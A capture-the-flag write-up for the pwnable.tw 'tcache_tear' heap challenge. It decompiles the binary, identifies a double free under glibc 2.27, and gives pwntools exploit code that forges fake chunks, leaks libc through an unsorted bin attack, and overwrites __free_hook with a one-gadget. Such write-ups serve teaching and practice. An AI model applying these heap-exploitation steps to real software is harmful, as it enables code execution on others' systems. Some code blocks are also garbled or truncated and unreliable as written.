summary: Utilizing double free to create a fake chunk in the BSS section of the ELF and freeing the chunk into the unsorted bin by using Unsorted Bin Attack to leak libc and overwrite __free_hook.

## Description

![alt text](/static/writeups/pwnable.tw/image.png)

## Solution

In this challenge, we're given a stripped x64 binary. Along with that, we're given a libc; so using `pwninit` to link the libc to the binary. Checking the mitigations on the binary:

> PIE is disabled.

Now, let's firstly run this binary and see what's going on:

![alt text](/static/writeups/pwnable.tw/image-2.png)

The binary firstly asks for a simple name and we're presented with a menu (which is pretty common in all of the heap challenges.)

---

## Disassembly

> Since the binary was stripped, in ghidra, I renamed the variables to make sense of each of them. The main function is as follows:

```c:main
void main(void)

{
  long input;
  uint idx;

  init();
  printf("Name:");
  get_str_input(&NAME_BUFFER,0x20);
  idx = 0;
  do {
    while( true ) {
      while( true ) {
        menu();
        input = get_input();
        if (input != 2) break;
        if (idx < 8) {
          free(GLOBAL_BUFFER);
          idx = idx + 1;
        }
      }
      if (2 < input) break;
      if (input == 1) {
        allocate_buffer();
      }
      else {
LAB_00400c75:
        puts("Invalid choice");
      }
    }
    if (input != 3) {
      if (input == 4) {
                    /* WARNING: Subroutine does not return */
        exit(0);
      }
      goto LAB_00400c75;
    }
    info();
  } while( true );
}
```

Now, let's see the `allocate_buffer` function:

```c:allocate_buffer
void allocate_buffer(void)

{
  ulong __size;

  printf("Size:");
  __size = get_input();
  if (__size < 0x100) {
    GLOBAL_BUFFER = malloc(__size);
    printf("Data:");
    get_str_input(GLOBAL_BUFFER,(int)__size + -0x10);
    puts("Done !");
  }
  return;
}
```

In this function, we're simply asked for the size and the data we want to put. Whereas in main, when we select `2`, we simply `free` the buffer, and when we press `3`, we go into the `info` function:

```c:info
void info(void)

{
  printf("Name :");
  write(1,&NAME_BUFFER,0x20);
  return;
}
```

Here, the program simply prints the Name buffer, which gives us a read primitive.

---

## Exploitation

The bug lies in the program when we free a chunk. It doesn't check if we've already freed a chunk which can lead to a Double Free Bug, which can grant us an arbitrary write.

> This is possible because we're pwning this against libc 2.27. This sort of Double Free was fixed in libc >= 2.33.

We'll use this double free bug to perform an Unsorted Bin attack to leak libc and then overwrite `__free_hook` with one gadget.

## Unsorted Bin Attack

The unsorted bin attack is an attack technique that allows the address of the `main_arena` area to be written to an arbitrary address when the `BK pointer` of the freed chunk can be manipulated. Now, in our scenario, we'll use the Unsorted Bin Attack to leak the address of libc's main arena.

In order to perform this attack, we'll chain together the double free bug that we already identified.

To make it work, we'll firstly create a fake chunk near the `NAME` field. Since that field is in bss section. We can easily write data to it, and utilizing it with our double free to perform an Arbitrary Address Write (AAW).

So, the exploit for us will be as follows:

```py:exploit.py
#!/usr/bin/env python3

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]

encode = lambda e: e if type(e) == bytes else str(e).encode()
hexleak = lambda l: int(l[:-1] if l[-1] == '\n' else l, 16)
fixleak = lambda l: unpack(l.ljust(8, b"\x00"))

exe = "./tcache_tear_patched"
elf = context.binary = ELF(exe)
libc = elf.libc
io = remote(sys.argv[1], int(sys.argv[2])
    ) if args.REMOTE else process(argv=[exe], aslr=False)
if args.GDB: gdb.attach(io, """
    b *main
""")

DEBUG = True

def menu(idx):
    io.sendlineafter(b":", encode(idx))

def malloc(sz, data):
    if DEBUG: info("Allocating chunk of size %d" % sz)
    menu(1)
    io.sendlineafter(b"Size:", encode(sz))
    io.sendlineafter(b"Data:", encode(data))

def free():
    menu(2)

def get_info():
    menu(3)
    io.recvuntil(b"Name :")
    return io.recvuntil(b"$")[:-1]

NAME_BUF = 0x602060

# Set name:
menu("theflash2k")
```

Now, the next thing we need to do is to create a fake chunk, and set the `BK` of that chunk to be `address+0x10`. So that once that chunk will be freed, the address stored at `BK`, `-0x10`, will contain the libc's main arena's address.

To perform this, we must choose the size of the buffer to be allocated to be in the range of unsorted bin rather than tcache. We can simply choose a large number. Since we also need to set the `PREV_INUSE` bit, we can `OR` it by 1. For our chunk, the layout will be as follows:

```table
| ------------- | ---- SIZE ----- |
| ------------ DATA ------------- |
| ---- FD ----- | ----- BK ------ |
```

Now, we know that we need to write the arbitrary address at `BK`, we can generate a simple fake chunk as follows:

```py
fake_chunk = flat(
    0x0,
    0x420 | 1,
    0x0, 0x0, 0x0,
    NAME_BUF + 0x10 # +0x10 so that the FD and BK pointers are written to this address
)
```

Along with the double free bug, we'll chain this and the payload will be as follows:

```py
malloc(0x60, b"CCCC")
free()
free()
malloc(0x60, p64(NAME_BUF))
malloc(0x60, "BBBB")
malloc(0x60, fake_chunk)
free()
```

However, upon running this, we're greeted with the following message:

![alt text](/static/writeups/pwnable.tw/image-3.png)

Upon debugging it in gdb and following the `backtrace`, we see:

![alt text](/static/writeups/pwnable.tw/image-4.png)

In `malloc.c` on line `4281`; using [Elixir](https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L4281):

```c:malloc.c
nextchunk = chunk_at_offset(p, size);
...
if (__glibc_unlikely (!prev_inuse(nextchunk)))
    malloc_printerr ("double free or corruption (!prev)");
```

Now, we can see that in glibc 2.27, there's a mitigation, that checks if the `prev_inuse` bit of the next chunk is not set, we cannot free the corresponding chunk because this chunk might be corrupted due to a double free bug.

The bypass; is fairly simple. Before allocating our fake chunk, we'll generate a fake chunk at `NAME_BUF + 0x420`. What this will allow us to do is to bypass this check. Because, when malloc will check for the next chunk, we'll have already created a fake chunk at `NAME_BUF + 0x420`, whose `PREV_INUSE` bit will be set to 1.

What we'll do, use a different tcache bin, perform a tcache-dup/double free, write the fake chunk. Then after that, we'll use our previous attack to perform unsorted bin attack and leak libc value.

Now, the layout for this fake chunk will be as follows:

```table
| ------------- | ---- SIZE ----- |
| ------------ DATA ------------- |
| ---- DATA --- | ---- SIZE ----- |
```

Now, the fake chunk for this will be as follows:

```py
fake_chunk = flat(
    0x0,
    0x20 | 1,
    0x0, 0x0, 0x0,
    0x420 | 1
)
```

The reason we're using `0x20` as the size of our small chunk is because it's the smallest chunk that we can allocate using malloc. After the `0x18` size of writable chunk, we can create another fake size field, but this time, the size would be that of the chunk we're already trying to allocate.

The updated exploit with both of these attacks:

```py:exploit.py
"""
Bypassing GLIBC Mitigation
"""
malloc(0x50, b"AAAA")
free()
free()

fake_chunk = flat(
    0x0,
    0x20 | 1,
    0x0, 0x0, 0x0,
    0x420 | 1
)
malloc(0x50, p64(NAME_BUF + 0x420))
malloc(0x50, "BBBB")
malloc(0x50, fake_chunk)


"""

malloc(0x60, b"CCCC")

fake_chunk = flat(

    0x420 | 1,
    0x0, 0x0, 0x0,
    NAME_BUF + 0x10
)

malloc(0x60, p64(NAME_BUF))
malloc(0x60, "BBBB")
malloc(0x60, fake_chunk)
```

Now, looking at the `NAME_BUF` address in gdb:

![alt text](/static/writeups/pwnable.tw/image-5.png)

We can see that the `BK` pointer now points to `0x602070`. Now, let's free this chunk and then analyze the memory again:

![alt text](/static/writeups/pwnable.tw/image-6.png)

We can see that now, the unsorted bin contains our `NAME_BUF` and also, the `FD` and `BK` pointers now point to the libc's `main_arena`. Now, if we see the info, we'll see that we get a libc leak:

![alt text](/static/writeups/pwnable.tw/image-7.png)

We can easily parse this leak and get a leak to libc by calculating the offsets.

```py
leak = get_info()[:-10][-6:]
print(leak)
leak = fixleak(leak)
info("libc leak @ %#x" % leak)

libc.address = leak - 0x3ebca0
info("libc @ %#x" % libc.address)
```

## Free Hook Overwrite

This portion is fairly simple as we already have our AAW. What we need to do here, is select the next tcache bin, perform a tcache dup to get `__free_hook` into our bin and then overwrite the `__free_hook` with one gadget. The exploit for that is as follows:

```py
malloc(0x90, "AAAA")
free()
free()

malloc(0x90, p64(libc.sym.__free_hook))
malloc(0x90, "BBBB")
malloc(0x90, p64(libc.address + 0x4f322))
```

After cleaning up the code to make it more readable, the final exploit is as follows:

```py:exploit.py
#!/usr/bin/env python3

elf = context.binary = ELF(exe)
libc = elf.libc
io = remote(sys.argv[1], int(sys.argv[2])
    ) if args.REMOTE else process(argv=[exe], aslr=False)
